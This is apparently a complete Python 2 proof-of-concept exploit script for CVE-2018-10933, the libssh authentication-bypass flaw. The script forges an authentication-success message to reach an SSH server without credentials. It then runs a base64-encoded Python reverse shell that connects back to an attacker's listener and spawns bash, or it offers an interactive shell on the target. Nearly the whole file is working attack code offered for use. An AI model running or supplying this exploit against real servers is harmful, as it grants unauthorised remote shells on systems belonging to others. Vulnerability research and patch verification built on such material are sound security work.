#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#▄▄▌  ▪  ▄▄▄▄· .▄▄ · .▄▄ ·  ▄ .▄▄▄▄   ▄▄· ▄▄▄ .								                                #
#██•  ██ ▐█ ▀█▪▐█ ▀. ▐█ ▀. ██▪▐█▀▄ █·▐█ ▌▪▀▄.▀·▐█									                        #
#██▪  ▐█·▐█▀▀█▄▄▀▀▀█▄▄▀▀▀█▄██▀▐█▐▀▀▄ ██ ▄▄▐▀▀▪▄																#
#▐█▌▐▌▐█▌██▄▪▐█▐█▄▪▐█▐█▄▪▐███▌▐▀▐█•█▌▐███▌▐█▄▄▌																#
#.▀▀▀ ▀▀▀·▀▀▀▀  ▀▀▀▀  ▀▀▀▀ ▀▀▀ ·.▀  ▀·▀▀▀  ▀▀▀ 																#
# libssh_rce.py - nighter                                                                                   #
#                                                                                                           #
# DATE                                                                                                      #
# 25/10/2018                                                                                                #
#                                                                                                           #
# DESCRIPTION   																							#
#                                                                                            				#
# CVE-2018-10933 - A vulnerability was found in libssh's server-side state machine before versions 			#
# 0.7.6 and 0.8.4. A malicious client could create channels without first performing authentication, 		#
# resulting in unauthorized access. This PoC gives you a tty shell by abuse this vulnerability.             #
#                                                                                                           #
# mikael.kall@kindredgroup.com                                                                              #
#                                                                                                           #
#############################################################################################################

import paramiko
import requests
import random
import signal
import termios
import select
import socket
import os
import fcntl
import base64
import sys
import socket
import time
import os
import json
import time
import urllib as ul

import SocketServer
from multiprocessing import Process


# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    os._exit(0)
signal.signal(signal.SIGINT, signal_handler)

class PTY:
    def __init__(self, slave=0, pid=os.getpid()):
        # apparently python GC's modules before class instances so, here
        # we have some hax to ensure we can restore the terminal state.
        self.termios, self.fcntl = termios, fcntl

        # open our controlling PTY
        self.pty = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")

        # store our old termios settings so we can restore after
        # we are finished
        self.oldtermios = termios.tcgetattr(self.pty)

        # get the current settings se we can modify them
        newattr = termios.tcgetattr(self.pty)

        # set the terminal to uncanonical mode and turn off
        # input echo.
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        # don't handle ^C / ^Z / ^\
        newattr[6][termios.VINTR] = '\x00'
        newattr[6][termios.VQUIT] = '\x00'
        newattr[6][termios.VSUSP] = '\x00'

        # set our new attributes
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        # store the old fcntl flags
        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        # fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        # make the PTY non-blocking
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)

    def write(self, data):
        ret = self.pty.write(data)
        self.pty.flush()
        return ret

    def fileno(self):
        return self.pty.fileno()

    def __del__(self):
        # restore the terminal settings on deletion
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)


class Shell:
    def __init__(self, addr, bind=True):
        self.bind = bind
        self.addr = addr

        if self.bind:
            self.sock = socket.socket()
            self.sock.bind(self.addr)
            self.sock.listen(5)

    def handle(self, addr=None):
        addr = addr or self.addr
        if self.bind:
            sock, addr = self.sock.accept()
        else:
            sock = socket.socket()
            sock.connect(addr)

        # create our PTY
        pty = PTY()

        # input buffers for the fd's
        buffers = [[sock, []], [pty, []]]

        def buffer_index(fd):
            for index, buffer in enumerate(buffers):
                if buffer[0] == fd:
                    return index

        readable_fds = [sock, pty]

        data = " "
        # keep going until something deds
        while data:
            # if any of the fd's need to be written to, add them to the
            # writable_fds
            writable_fds = []
            for buffer in buffers:
                if buffer[1]:
                    writable_fds.append(buffer[0])

            r, w, x = select.select(readable_fds, writable_fds, [])

            # read from the fd's and store their input in the other fd's buffer
            for fd in r:
                buffer = buffers[buffer_index(fd) ^ 1][1]
                if hasattr(fd, "read"):
                    data = fd.read(8192)
                else:
                    data = fd.recv(8192)
                if data:
                    buffer.append(data)

            # send data from each buffer onto the proper FD
            for fd in w:
                buffer = buffers[buffer_index(fd)][1]
                data = buffer[0]
                if hasattr(fd, "write"):
                    fd.write(data)
                else:
                    fd.send(data)
                buffer.remove(data)

        # close the socket
        sock.close()


def BuildPythonReverseShell():

    python_rev_shell = '''python -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
 s.connect(("%s", %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()\'''' % (LHOST, LPORT)
    payload = 'echo %s|base64 -d|bash' % base64.b64encode(python_rev_shell)
    return payload


def Exploit():

    if ':' in HOST:
        (host, port) = HOST.split(':')
    else:
        host = HOST
        port = '22'

    time.sleep(5)
    payload = BuildPythonReverseShell()
    print("[+] Exploit")

    try:
        s = socket.socket()
        s.connect((str(host),int(port)))
        msg = paramiko.message.Message()
        msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        trans = paramiko.transport.Transport(s)
        trans.packetizer.REKEY_BYTES = pow(2, 40)
        trans.packetizer.REKEY_PACKETS = pow(2, 40)
        trans.start_client(timeout=5)
        trans._send_message(msg)
        session = trans.open_session(timeout=10)
        session.exec_command(payload)
        out_file = session.makefile("rb",4096)
        output = out_file.read()
        out_file.close()
        s.close()
        return
    except Exception as e:
        print("[-] Exploit: %s" % str(e))
        return


def Interactive():

    if ':' in HOST:
        (host, port) = HOST.split(':')
    else:
        host = HOST
        port = '22'

    try:
        s = socket.socket()
        s.connect((str(host), int(port)))
        msg = paramiko.message.Message()
        msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        trans = paramiko.transport.Transport(s)
        trans.packetizer.REKEY_BYTES = pow(2, 40)
        trans.packetizer.REKEY_PACKETS = pow(2, 40)
        trans.start_client(timeout=5)
        trans._send_message(msg)
        session = trans.open_session(timeout=10)

        session.get_pty()
        session.invoke_shell()
        session.send("stty -echo\n")

        while True:
            command = raw_input('# ')
            if command == 'exit':
                break

            session.send(command + "\n")

            while True:
                if session.recv_ready():
                    output = session.recv(1024)
                    print(output.replace('#', ''))
                else:
                    time.sleep(0.5)
                    if not (session.recv_ready()):
                        break
        s.close()
        return
    except Exception as e:
        print(str(e))
        return


if __name__ == '__main__':

    # For interactive mode.
    try:
        if 'interactive' in sys.argv[2] or 'int' in sys.argv[2]:
            HOST = sys.argv[1]
            Interactive()
            os._exit(0)
    except:
        pass

    if len(sys.argv) != 4:
        print ("""
▄▄▌  ▪  ▄▄▄▄· .▄▄ · .▄▄ ·  ▄ .▄▄▄▄   ▄▄· ▄▄▄ .
██•  ██ ▐█ ▀█▪▐█ ▀. ▐█ ▀. ██▪▐█▀▄ █·▐█ ▌▪▀▄.▀·
██▪  ▐█·▐█▀▀█▄▄▀▀▀█▄▄▀▀▀█▄██▀▐█▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐█▌▐▌▐█▌██▄▪▐█▐█▄▪▐█▐█▄▪▐███▌▐▀▐█•█▌▐███▌▐█▄▄▌
.▀▀▀ ▀▀▀·▀▀▀▀  ▀▀▀▀  ▀▀▀▀ ▀▀▀ ·.▀  ▀·▀▀▀  ▀▀▀
[mikael.kall@kindredgroup.com]
    """)
        print("Usage: %s <HOST:PORT> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./libssh_rce.py '127.0.0.1' 10.30.6.147 1337")
        print("EXAMPLE: ./libssh_rce.py '127.0.0.1' interactive\n")
        sys.exit(0)

    HOST = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print "[+] LHOST = %s" % LHOST
    print "[+] LPORT = %s" % LPORT

    # Run exploit Async
    p = Process(target=Exploit)
    p.start()

    # Start listener
    print("[+] Shell listen")
    s = Shell((LHOST, int(LPORT)), bind=True)
    s.handle()
